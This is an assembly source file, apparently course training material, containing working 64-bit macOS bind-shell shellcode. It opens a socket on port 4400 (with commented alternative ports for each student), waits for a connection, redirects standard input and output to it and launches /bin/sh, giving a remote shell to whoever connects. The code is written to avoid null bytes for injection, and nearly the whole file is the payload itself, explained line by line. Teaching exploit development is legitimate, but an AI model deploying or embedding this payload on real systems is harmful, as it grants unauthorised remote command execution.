; Shellcode: Mac OS X 64-bit Portbind (less large 181 byte version for training)
[SECTION .text]
BITS 64
 
;int 3

;socket
                                ; Mac OS X - ABI INFO: https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/LowLevelABI/000-Introduction/introduction.html#//apple_ref/doc/uid/TP40002521
                                ; Mac OS X - ABI INFO: https://opensource.apple.com/source/xnu/<XNU-VERSION>/osfmk/mach/i386/syscall_sw.h (Syscall Classes)
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: #define SYS_socket         97 (0x61)
                                ; SYSCALL INFO: man 2 socket
                                ; SYSCALL INFO:         int socket(int domain, int type, int protocol);
                                ; SYSCALL INFO: syscall num = rax = 0x02000061 (syscall class 2, syscall number 0x61)
                                ; SYSCALL INFO: parameter 1 = rdi = 2 (PF_INET = AF_INET = 2 - domain)
                                ; SYSCALL INFO: parameter 2 = rsi = 1 (SOCK_STREAM - type)
                                ; SYSCALL INFO: parameter 3 = rdx = 0

    xor rax, rax                ; making sure rax is 0
    ;mov eax, 0x02000061        ; place syscall class/number (0x02000061) into eax
    push rax                    ; saving 0x0 onto the stack to save instruction size when we zero out the parameter registers
    push rax                    ; saving 0x0 onto the stack to save instruction size when we zero out the parameter registers
    push rax                    ; saving 0x0 onto the stack to save instruction size when we zero out the parameter registers
    mov ax, 0x6102              ; get syscall class 2 and the syscall number 61 for write into ax (4 bytes)
    ror eax, 8                  ; rotate (8 bits) the syscall numbers around into position
    ;mov rdi, 2                 ; place type (2) into rdi
    ;mov rsi, 1                 ; place domain (1) into rsi
    pop rdi                     ; place zero into rdi
    pop rsi                     ; place zero into rsi
    pop rdx                     ; place zero into rdx
    mov dil, 2                  ; place 2 into rdi
    inc rsi                     ; increment rsi to 1 to represent type (2)
    syscall                     ; execute syscall socket(PF_INET, SOCK_STREAM, 0); ... socket returned into rax
 
    mov r12, rax                ; Save the socket in rax into r12


;bind
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: define SYS_bind           104 (0x68)
                                ; SYSCALL INFO: man 2 bind
                                ; SYSCALL INFO:         int bind(int socket, const struct sockaddr *address, socklen_t address_len);
                                ; SYSCALL INFO: syscall num = rax = 0x02000068
                                ; SYSCALL INFO: parameter 1 = rdi = r12
                                ; SYSCALL INFO: parameter 2 = rsi = sockaddr* (000000005c110210 = 0.0.0.0 + 4444 + AF_INET + size) (please, see: man 4 netintro)
                                ; SYSCALL INFO: parameter 3 = rdx = 0x10 (16)

                                ; from: man 4 netintro
                                ; struct sockaddr {
                                ;             u_char  sa_len;
                                ;             u_char  sa_family;
                                ;             char    sa_data[14];
                                ; };
                                ;
                                ; from: netinet/in.h
                                ; struct sockaddr_in {
                                ;             __uint8_t       sin_len;      // 1 byte
                                ;             sa_family_t     sin_family;   // 1 byte
                                ;             in_port_t       sin_port;     // 2 bytes
                                ;             struct in_addr  sin_addr;     // 4 bytes - to store an IPv4 address
                                ;             char            sin_zero[8];  // 8 bytes - padding
                                ; };

                                ; Here we will create our sockaddr structure in the stack.
                                ; 1 - pushing sockaddr_in.sin_zero onto the stack (our structure padding)
    xor rax, rax                ; rax = 0
    push rax                    ; push 0x0000000000000000 (8 bytes - sockaddr_in.sin_zero) onto the stack
    ;push 0x30110210            ; push 0x3011 as port 4400/tcp (0x1130 = 4400), and low order bytes as 0x0210 for AF_INET (2) + size (16)
                                ; IMPORTANT: Each student must use a different bind port. Port allocations listed below. Uncomment your corresponding line.
    ;push 0x30110210            ; instructor: port 4400/tcp
    mov eax, 0x30110210         ; creating the rest of the structure:
                                ;       sockaddr_in.sin_len     = 0x10 (16, for size of this structure)
                                ;       sockaddr_in.sin_family  = 0x2 (AF_INET - for IPv4)
                                ;       sockaddr_in.sin_port    = 0x1130 (port: 4400)
                                ;       sockaddr_in.sin_addr    = 0.0.0.0 (the high part of rax already is 0x00000000)
    push rax                    ; push structure onto the stack
    mov rsi, rsp                ; place stack pointer rsp of our sockaddr structure into rsi
	
    ;push 0x31110210            ; student01: port 4401/tcp
    ;push 0x32110210            ; student02: port 4402/tcp
    ;push 0x33110210            ; student03: port 4403/tcp
    ;push 0x34110210            ; student04: port 4404/tcp
    ;push 0x35110210            ; student05: port 4405/tcp
    ;push 0x36110210            ; student06: port 4406/tcp
    ;push 0x37110210            ; student07: port 4407/tcp
    ;push 0x38110210            ; student08: port 4408/tcp
    ;push 0x39110210            ; student09: port 4409/tcp
    ;push 0x3a110210            ; student10: port 4410/tcp
    ;push 0x3b110210            ; student11: port 4411/tcp
    ;push 0x3c110210            ; student12: port 4412/tcp
    ;push 0x3d110210            ; student13: port 4413/tcp
    ;push 0x3e110210            ; student14: port 4414/tcp
    ;push 0x3f110210            ; student15: port 4415/tcp
    ;push 0x40110210            ; student16: port 4416/tcp
    ;push 0x41110210            ; student17: port 4417/tcp
    ;push 0x42110210            ; student18: port 4418/tcp
    ;push 0x43110210            ; student19: port 4419/tcp
    ;push 0x44110210            ; student20: port 4420/tcp
    ;push 0x45110210            ; student21: port 4421/tcp
    ;push 0x46110210            ; student22: port 4422/tcp
    ;push 0x47110210            ; student23: port 4423/tcp
    ;push 0x48110210            ; student24: port 4424/tcp
    ;push 0x49110210            ; student25: port 4425/tcp
    ;push 0x4a110210            ; student26: port 4426/tcp
    ;push 0x4b110210            ; student27: port 4427/tcp
    ;push 0x4c110210            ; student28: port 4428/tcp
    ;push 0x4d110210            ; student29: port 4429/tcp
    ;push 0x4e110210            ; student30: port 4430/tcp
    ;push 0x4f110210            ; student31: port 4431/tcp
    ;push 0x50110210            ; student32: port 4432/tcp
    ;push 0x51110210            ; student33: port 4433/tcp
    ;push 0x52110210            ; student34: port 4434/tcp
    ;push 0x53110210            ; student35: port 4435/tcp
    ;push 0x54110210            ; student36: port 4436/tcp
    ;push 0x55110210            ; student37: port 4437/tcp
    ;push 0x56110210            ; student38: port 4438/tcp
    ;push 0x57110210            ; student39: port 4439/tcp
    ;push 0x58110210            ; student40: port 4440/tcp
    ;push 0x59110210            ; student41: port 4441/tcp
    ;push 0x5a110210            ; student42: port 4442/tcp
    ;push 0x5b110210            ; student43: port 4443/tcp
    ;push 0x5c110210            ; student44: port 4444/tcp
    ;push 0x5d110210            ; student45: port 4445/tcp
    ;push 0x5e110210            ; student46: port 4446/tcp
    ;push 0x5f110210            ; student47: port 4447/tcp
    ;push 0x60110210            ; student48: port 4448/tcp
    ;push 0x61110210            ; student49: port 4449/tcp
    ;push 0x62110210            ; student50: port 4450/tcp


    mov rdi, r12                ; place saved socket from r12 into rdi

                                ; configuring our system call number
    xor rax, rax
    ;mov eax, 0x02000068        ; place syscall class/number (0x02000068) into eax
    mov ax, 0x6802              ; get syscall class 2 and the syscall number 68 for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position

                                ; rdx = 16 bytes (size of the sockaddr structure)
    ;mov rdx, 0x10              ; place 0x10 into rdx
    xor rdx, rdx                ; zero out rdx
    mov dl, 0x10                ; place 0x10 into lowest byte of rdx
    syscall                     ; execute syscall bind(socket, sockaddr*, 0x10)


;listen
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: #define SYS_listen         106 (0x6a)
                                ; SYSCALL INFO: man 2 listen
                                ; SYSCALL INFO:         int listen(int socket, int backlog);
                                ; SYSCALL INFO: syscall num = rax = 0x0200006a
                                ; SYSCALL INFO: parameter 1 = rdi = r12
                                ; SYSCALL INFO: parameter 2 = rsi = 5

    xor rax, rax                ; zero out rax
    push rax                    ; zero out rsi
    pop rsi                     ; zero out rsi
    ;mov eax, 0x0200006a        ; place syscall class/number (0x0200006a) into eax
    mov ax, 0x6a02              ; syscall 0x0200006a into rax
    ror eax, 8                  ; syscall 0x0200006a into rax
    mov rdi, r12                ; rdi = socket descriptor saved in r12
    ;mov rsi, 5                 ; place backlog of 5 into rsi
    mov sil, 5                  ; rsi = 5 as backlog

;    mov al, 5                   ; rax is zero after previous instruction, so put 5 into al (lowest byte of rax)
;    mov esi, eax                ; place backlog of 5 from eax into esi (syscall only checks lower half of rax, so only need eax)
;    ;mov eax, 0x0200006a        ; place syscall class/number (0x0200006a) into eax
;    mov ax, 0x6a02              ; get syscall class 2 and the syscall number 6a for write into ax (4 bytes)
;    ror eax, 8                  ; rotate the syscall numbers around into position
;    mov rdi, r12                ; place saved socket from r12 into rdi
;    ;mov rsi, 5                 ; place backlog of 5 into rsi
                                ; no parameter required for rdx
    syscall                     ; execute syscall listen(socket, 0x05)


;accept
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: #define SYS_accept         30 (0x1e)
                                ; SYSCALL INFO: man 2 accept
                                ; SYSCALL INFO:         int accept(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
                                ; SYSCALL INFO: syscall num = rax = 0x0200001e
                                ; SYSCALL INFO: parameter 1 = rdi = r12
                                ; SYSCALL INFO: parameter 2 = rsi = 0		(info about who is connecting - we don't need it)
                                ; SYSCALL INFO: parameter 3 = rdx = 0		(size - we also don't need it)

    xor rax, rax                ; zero out rax
    push rax                    ; save for zero out rdx
    push rax                    ; save for zero out rsi
    ;mov eax, 0x0200001e        ; place syscall class/number (0x0200001e) into eax
    mov ax, 0x1e02              ; get syscall class 2 and the syscall number 1e for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position
    mov rdi, r12                ; place saved socket from r12 into rdi
    pop rsi                     ; place zero into rsi
    pop rdx                     ; place zero into rdx
    syscall                     ; execute syscall accept(socket, 0, 0)

    mov r9, rax                 ; save new socket from rax to r9


;dup2                           ; Duplicate our socket three times for stdin (0), stdout (1), stderr (2)
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: #define SYS_dup2           90 (0x5a)
                                ; SYSCALL INFO: man 2 dup2
                                ; SYSCALL INFO:         int dup2(int fildes, int fildes2);
                                ; SYSCALL INFO: syscall num = rax = 0x0200005a
                                ; SYSCALL INFO: parameter 1 = rdi = r12
                                ; SYSCALL INFO: parameter 2 = rsi = 0, and then repeat syscall with 1, and then repeat syscall with 2

    xor rax, rax
    ;mov eax, 0x0200005a        ; place syscall class/number (0x0200005a) into eax
    mov ax, 0x5a02              ; get syscall class 2 and the syscall number 5a for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position
    mov rdi, r9                 ; place saved socket from r9 into rdi
    xor rsi, rsi                ; place 0 into rsi
    syscall                     ; execute syscall dup2(socket, 0)

    xor rax, rax
    ;mov eax, 0x0200005a        ; place syscall class/number (0x0200005a) into eax
    mov ax, 0x5a02              ; get syscall class 2 and the syscall number 5a for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position
    mov rdi, r9                 ; place saved socket from r9 into rdi
    xor rsi, rsi
    inc rsi                     ; increment rsi to be 1
    syscall                     ; execute syscall dup2(socket, 1)

    xor rax, rax
    ;mov eax, 0x0200005a        ; place syscall class/number (0x0200005a) into eax
    mov ax, 0x5a02              ; get syscall class 2 and the syscall number 5a for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position
    mov rdi, r9                 ; place saved socket from r9 into rdi
    xor rsi, rsi
    mov sil, 2                  ; place 2 into rsi
    syscall                     ; execute syscall dup2(socket, 2)


;execve
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: #define SYS_execve         59 (0x3b)
                                ; SYSCALL INFO: man 2 execve
                                ; SYSCALL INFO:         int execve(const char *path, char *const argv[], char *const envp[]);
                                ; SYSCALL INFO: syscall num = rax = 0x0200003b
                                ; SYSCALL INFO: parameter 1 = rdi = command*
                                ; SYSCALL INFO: parameter 2 = rsi = 0         (no arguments)
                                ; SYSCALL INFO: parameter 3 = rdx = 0         (no environment vars)

                                ; construct our command shell string on stack
    ;mov r13, 0x0068732f6e69622f  ; '/bin/sh' in hex with null terminator
    mov r13, 0x68732f6e69622fff ; '/bin/sh' in hex with null terminator
    shr r13, 8                  ; shift the placeholder off the end
    push r13                    ; push to the stack

    xor rax, rax
    ;mov eax, 0x0200003b        ; place syscall class/number (0x0200003b) into eax
    mov ax, 0x3b02              ; get syscall class 2 and the syscall number 3b for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position
    mov rdi, rsp                ; place stack pointer rsp to command string into rdi
    xor rsi, rsi                ; place zero into rsi
    xor rdx, rdx                ; place zero into rdx
    syscall                     ; execute syscall exec(rdi, 0, 0)


;exit
                                ; SYSCALL INFO: Xcode: /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
                                ; SYSCALL INFO: #define SYS_exit           1
                                ; SYSCALL INFO: int      exit(int code);
                                ; SYSCALL INFO: syscall num = rax = 0x02000001
                                ; SYSCALL INFO: parameter 1 = rdi = 0

    xor rax, rax
    ;mov eax, 0x02000001        ; place syscall class/number (0x02000001) into eax
    mov ax, 0x0102              ; get syscall class 2 and the syscall number 01 for write into ax (4 bytes)
    ror eax, 8                  ; rotate the syscall numbers around into position
    xor rdi, rdi                ; place zero into rdi
    syscall                     ; call exit(0)

